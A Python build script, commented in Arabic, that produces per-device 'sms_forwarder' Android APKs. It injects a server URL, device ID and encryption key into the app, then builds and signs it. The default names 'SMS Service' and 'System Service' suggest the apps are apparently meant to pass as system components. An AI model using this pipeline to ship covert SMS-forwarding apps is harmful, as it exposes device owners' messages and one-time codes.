#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
APK Builder - مولد ملفات APK

هذا الملف يحتوي على دوال لإنشاء ملفات APK ديناميكياً باستخدام أدوات البناء (Gradle).
"""

import os
import shutil
import json
import logging
import subprocess
import xml.etree.ElementTree as ET
from pathlib import Path

from utils.config import (
    APK_TEMPLATE_PATH, APK_OUTPUT_PATH, 
    KEYSTORE_PATH, KEYSTORE_ALIAS, KEYSTORE_PASSWORD
)

logger = logging.getLogger(__name__)


def prepare_project(template_path, output_path, config):
    """نسخ مشروع Android الأساسي وتعديل ملفات التكوين
    
    Args:
        template_path: مسار مجلد القالب الأساسي
        output_path: مسار المجلد الهدف
        config: قاموس يحتوي على قيم التكوين (مثل عنوان الخادم ورقم الجهاز)
        
    Returns:
        مسار المشروع المعدل
    """
    # التحقق من وجود مجلد القالب
    if not os.path.exists(template_path):
        raise FileNotFoundError(f"مجلد القالب غير موجود: {template_path}")
    
    # إنشاء مجلد الإخراج إذا لم يكن موجوداً
    os.makedirs(output_path, exist_ok=True)
    
    # تحديد اسم المشروع (يمكن استخدام معرف الجهاز أو أي معرف فريد آخر)
    project_name = f"sms_forwarder_{config.get('device_id', 'unknown')}"
    project_path = os.path.join(output_path, project_name)
    
    # حذف المجلد إذا كان موجوداً
    if os.path.exists(project_path):
        shutil.rmtree(project_path)
    
    # نسخ مجلد القالب
    logger.info(f"نسخ مشروع القالب من {template_path} إلى {project_path}")
    shutil.copytree(template_path, project_path)
    
    # تعديل ملف config.json إذا كان موجوداً
    config_json_path = os.path.join(project_path, "app", "src", "main", "assets", "config.json")
    if os.path.exists(config_json_path):
        with open(config_json_path, 'r', encoding='utf-8') as f:
            config_data = json.load(f)
        
        # تحديث القيم
        config_data.update({
            "api_url": config.get("api_url"),
            "device_id": config.get("device_id"),
            "encryption_key": config.get("encryption_key"),
            "app_name": config.get("app_name", "SMS Service")
        })
        
        # حفظ الملف المعدل
        with open(config_json_path, 'w', encoding='utf-8') as f:
            json.dump(config_data, f, indent=4)
        
        logger.info(f"تم تحديث ملف config.json")
    
    # تعديل ملف strings.xml إذا كان موجوداً
    strings_xml_path = os.path.join(project_path, "app", "src", "main", "res", "values", "strings.xml")
    if os.path.exists(strings_xml_path):
        try:
            tree = ET.parse(strings_xml_path)
            root = tree.getroot()
            
            # تحديث القيم
            for string_elem in root.findall("string"):
                if string_elem.get("name") == "app_name":
                    string_elem.text = config.get("app_name", "SMS Service")
                elif string_elem.get("name") == "api_url":
                    string_elem.text = config.get("api_url")
                elif string_elem.get("name") == "device_id":
                    string_elem.text = config.get("device_id")
            
            # حفظ الملف المعدل
            tree.write(strings_xml_path, encoding="utf-8", xml_declaration=True)
            logger.info(f"تم تحديث ملف strings.xml")
        
        except Exception as e:
            logger.error(f"خطأ في تعديل ملف strings.xml: {str(e)}")
    
    return project_path

def build_apk(project_path):
    """بناء ملف APK باستخدام Gradle
    
    Args:
        project_path: مسار مشروع Android
        
    Returns:
        مسار ملف APK الناتج
    """
    # التحقق من وجود مجلد المشروع
    if not os.path.exists(project_path):
        raise FileNotFoundError(f"مجلد المشروع غير موجود: {project_path}") 
    # تحديد أمر Gradle المناسب حسب نظام التشغيل
    if os.name == 'nt':  # Windows
        gradle_cmd = os.path.join(project_path, "gradlew.bat")
    else:  # Linux/Mac
        gradle_cmd = os.path.join(project_path, "gradlew")
        # جعل الملف قابل للتنفيذ
        os.chmod(gradle_cmd, 0o755)  
    # التحقق من وجود ملف Gradle
    if not os.path.exists(gradle_cmd):
        raise FileNotFoundError(f"ملف Gradle غير موجود: {gradle_cmd}")
    try:
        # تنفيذ أمر البناء
        logger.info(f"بدء بناء APK في {project_path}")
        process = subprocess.run(
            [gradle_cmd, "assembleRelease"],
            cwd=project_path,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )      
        # البحث عن ملف APK الناتج
        apk_path = os.path.join(
            project_path, "app", "build", "outputs", "apk", "release", "app-release-unsigned.apk"
        )   
        if os.path.exists(apk_path):
            logger.info(f"تم بناء APK بنجاح: {apk_path}")
            return apk_path
        else:
            raise FileNotFoundError(f"لم يتم العثور على ملف APK الناتج") 
    except subprocess.CalledProcessError as e:
        logger.error(f"فشل بناء APK: {e.stderr}")
        raise Exception(f"فشل بناء APK: {e.stderr}")
def sign_apk(apk_path, keystore_path=KEYSTORE_PATH, alias=KEYSTORE_ALIAS, keystore_password=KEYSTORE_PASSWORD):
    """توقيع ملف APK باستخدام مفتاح خاص
    
    Args:
        apk_path: مسار ملف APK غير الموقع
        keystore_path: مسار ملف المفتاح
        alias: اسم المفتاح
        keystore_password: كلمة مرور المفتاح
        
    Returns:
        مسار ملف APK الموقع
    """
    # التحقق من وجود ملف APK
    if not os.path.exists(apk_path):
        raise FileNotFoundError(f"ملف APK غير موجود: {apk_path}")
    
    # التحقق من وجود ملف المفتاح
    if not os.path.exists(keystore_path):
        raise FileNotFoundError(f"ملف المفتاح غير موجود: {keystore_path}")
    
    # تحديد مسار ملف APK الموقع
    signed_apk_path = apk_path.replace("-unsigned.apk", "-signed.apk")  
    try:
        # توقيع APK باستخدام apksigner
        logger.info(f"توقيع APK: {apk_path}")
        process = subprocess.run(
            [
                "apksigner", "sign",
                "--ks", keystore_path,
                "--ks-key-alias", alias,
                "--ks-pass", f"pass:{keystore_password}",
                "--out", signed_apk_path,
                apk_path
            ],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )      
        if os.path.exists(signed_apk_path):
            logger.info(f"تم توقيع APK بنجاح: {signed_apk_path}")
            return signed_apk_path
        else:
            raise FileNotFoundError(f"لم يتم العثور على ملف APK الموقع")   
    except subprocess.CalledProcessError as e:
        # محاولة استخدام jarsigner إذا فشل apksigner
        try:
            logger.info(f"محاولة توقيع APK باستخدام jarsigner")
            process = subprocess.run(
                [
                    "jarsigner",
                    "-keystore", keystore_path,
                    "-storepass", keystore_password,
                    "-keypass", keystore_password,
                    "-signedjar", signed_apk_path,
                    apk_path,
                    alias
                ],
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )      
            if os.path.exists(signed_apk_path):
                logger.info(f"تم توقيع APK بنجاح باستخدام jarsigner: {signed_apk_path}")
                return signed_apk_path
            else:
                raise FileNotFoundError(f"لم يتم العثور على ملف APK الموقع")       
        except subprocess.CalledProcessError as je:
            logger.error(f"فشل توقيع APK: {je.stderr}")
            raise Exception(f"فشل توقيع APK: {je.stderr}")
def generate_dynamic_apk(config, keystore_info=None):
    """توليد ملف APK ديناميكي
    
    Args:
        config: قاموس يحتوي على قيم التكوين (مثل عنوان الخادم ورقم الجهاز)
        keystore_info: معلومات المفتاح (اختياري)
        
    Returns:
        مسار ملف APK النهائي
    """
    try:
        if keystore_info is None:
            keystore_info = {
                "path": KEYSTORE_PATH,
                "alias": KEYSTORE_ALIAS,
                "password": KEYSTORE_PASSWORD
            }  
        # 1. تحضير المشروع
        project_path = prepare_project(APK_TEMPLATE_PATH, APK_OUTPUT_PATH, config)   
        # 2. بناء APK
        unsigned_apk_path = build_apk(project_path)      
        # 3. توقيع APK
        signed_apk_path = sign_apk(
            unsigned_apk_path,
            keystore_info.get("path"),
            keystore_info.get("alias"),
            keystore_info.get("password")
        )
        
        # 4. نسخ APK النهائي إلى مجلد الإخراج
        final_apk_name = f"sms_forwarder_{config.get('device_id', 'unknown')}.apk"
        final_apk_path = os.path.join(APK_OUTPUT_PATH, final_apk_name)
        
        # إنشاء مجلد الإخراج إذا لم يكن موجوداً
        os.makedirs(os.path.dirname(final_apk_path), exist_ok=True)
        
        # نسخ الملف
        shutil.copy2(signed_apk_path, final_apk_path)
        logger.info(f"تم إنشاء APK النهائي: {final_apk_path}")
        
        return final_apk_path
    
    except Exception as e:
        logger.error(f"خطأ في توليد APK: {str(e)}")
        raise


def prepare_flutter_project(template_path, output_path, config):
    """تحضير مشروع Flutter وتعديل ملفات التكوين
    
    Args:
        template_path: مسار مجلد قالب Flutter
        output_path: مسار المجلد الهدف
        config: قاموس يحتوي على قيم التكوين
        
    Returns:
        مسار المشروع المعدل
    """
    # نسخ مشروع Flutter الأساسي
    project_name = f"sms_forwarder_{config.get('device_id', 'unknown')}"
    project_path = os.path.join(output_path, project_name)
    
    if os.path.exists(project_path):
        shutil.rmtree(project_path)
    
    shutil.copytree(template_path, project_path)
    
    # تحديث AndroidManifest.xml
    manifest_path = os.path.join(project_path, "android", "app", "src", "main", "AndroidManifest.xml")
    update_android_manifest(manifest_path, config)
    
    # تحديث ملف dart_defines.json للمتغيرات البيئية
    dart_defines = {
        "API_BASE_URL": config.get("api_url"),
        "API_TOKEN": config.get("api_token"),
        "APP_NAME": config.get("app_name", "System Service"),
        "ENCRYPTION_KEY": config.get("encryption_key"),
        "DEVICE_ID": config.get("device_id")
    }
    
    # حفظ المتغيرات البيئية
    dart_defines_path = os.path.join(project_path, "dart_defines.json")
    with open(dart_defines_path, 'w', encoding='utf-8') as f:
        json.dump(dart_defines, f, indent=4)
    
    return project_path

def build_flutter_apk(project_path, dart_defines=None, timeout=1800):
    """بناء APK باستخدام Flutter
    
    Args:
        project_path: مسار مشروع Flutter
        dart_defines: المتغيرات البيئية
        timeout: المهلة الزمنية بالثواني (الافتراضي: 30 دقيقة)
        
    Returns:
        مسار ملف APK الناتج
    """
    try:
        # Initialize build command
        build_cmd = ["flutter", "build", "apk", "--release"]
        
        # Add environment variables if provided
        if dart_defines:
            for key, value in dart_defines.items():
                build_cmd.extend(["--dart-define", f"{key}={value}"])
        
        # إنشاء ملف للسجل
        log_file = os.path.join(project_path, "build_log.txt")
        
        # Execute the build command with timeout
        logger.info(f"Starting Flutter APK build in {project_path}")
        logger.info(f"Build command: {' '.join(build_cmd)}")
        logger.info(f"Build timeout set to {timeout} seconds")
        
        with open(log_file, 'w') as f:
            process = subprocess.Popen(
                build_cmd,
                cwd=project_path,
                stdout=f,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            # استخدام مؤقت للتحكم في وقت البناء
            try:
                process.wait(timeout=timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                logger.error(f"Flutter build timed out after {timeout} seconds")
                raise Exception(f"عملية البناء استغرقت وقتًا طويلاً (تجاوزت {timeout} ثانية). يرجى التحقق من سجل البناء.")
        
        # التحقق من نتيجة العملية
        if process.returncode != 0:
            with open(log_file, 'r') as f:
                error_log = f.read()
            logger.error(f"Flutter APK build failed with code {process.returncode}\n{error_log}")
            raise Exception(f"فشل بناء APK: رمز الخطأ {process.returncode}. راجع سجل البناء للتفاصيل.")
        
        # Locate the output APK file
        apk_path = os.path.join(
            project_path, "build", "app", "outputs", "flutter-apk", "app-release.apk"
        )
        
        if os.path.exists(apk_path):
            logger.info(f"Flutter APK built successfully: {apk_path}")
            return apk_path
        else:
            raise FileNotFoundError(f"ملف APK الناتج غير موجود")
            
    except subprocess.CalledProcessError as e:
        logger.error(f"Flutter APK build failed: {e.stderr}")
        raise Exception(f"Flutter APK build failed: {e.stderr}")
    except Exception as e:
        logger.error(f"Error building Flutter APK: {str(e)}")
      